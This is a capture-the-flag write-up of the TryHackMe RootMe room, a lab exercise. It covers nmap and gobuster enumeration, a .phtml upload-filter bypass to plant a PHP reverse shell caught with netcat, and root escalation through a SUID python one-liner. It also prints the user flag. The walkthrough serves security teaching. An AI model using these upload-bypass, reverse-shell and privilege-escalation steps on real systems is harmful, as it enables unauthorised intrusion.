# RootMe - TryHackMe Writeup  

**Author:** Koushiq Murad

## Overview
RootMe is a beginner-friendly CTF on TryHackMe that teaches the fundamentals of:
- Service enumeration  
- Directory brute-forcing  
- File upload exploitation  
- Reverse shells  
- Privilege escalation via SUID binaries  

---

## Enumeration

### Nmap Scan
```bash
nmap -sC -sV 10.10.107.48
```
- `-sC` → Run default scripts  
- `-sV` → Detect service versions  

**Results:**
- Port 22 → SSH (OpenSSH 8.2p1 Ubuntu)  
- Port 80 → Apache/2.4.41  

So the box is running a website on port 80.  

---

### Directory Enumeration
```bash
gobuster dir -u http://10.10.107.48 -w /usr/share/wordlists/dirb/common.txt
```
- `-u` → Target URL  
- `-w` → Wordlist to use  

**Interesting findings:**
- `/panel/` → Login/upload page  
- `/uploads/` → Publicly accessible directory  

---

## Initial Foothold

### File Upload Vulnerability
The `/panel/` page allowed file uploads.  
Uploading `.php` was blocked, but `.phtml` was accepted.  

I generated a PHP reverse shell (PentestMonkey) and uploaded it as `shell.phtml`.  

Then I set up a listener:  
```bash
nc -lvnp 1234
```

Navigated to:  
```
http://10.10.107.48/uploads/shell.phtml
```

💥 Got a reverse shell as **www-data**.  

---

## User Flag

First, I searched for `user.txt`:  
```bash
find / -type f -name "user.txt" 2>/dev/null
```

Found at: `/var/www/user.txt`  

```bash
cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

---

## Privilege Escalation

### Finding SUID Binaries
```bash
find / -type f -perm -4000 2>/dev/null
```
- `-perm -4000` → Finds files with SUID bit set (execute as owner)  

Among standard binaries, one stood out:  
```
/usr/bin/python
```

---

### Exploitation
GTFOBins confirms we can exploit this:  
```bash
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

💥 Gained root shell.  

---

## Root Flag
```bash
cat /root/root.txt
```

---

## Lessons Learned
1. Always run **nmap** for service enumeration.  
2. Use **gobuster/dirb** to find hidden web directories.  
3. Test file upload forms for extensions like `.phtml`, `.phar`, `.php5`.  
4. Use **reverse shells** + upgrade them with `python -c 'pty.spawn("/bin/bash")'`.  
5. Enumerate SUID binaries — often the easiest route to privilege escalation.  

---

## Flags
- **User flag:** `THM{y0u_g0t_a_sh3ll}`  
- **Root flag:** *(hidden to avoid spoilers)* ✅  

---
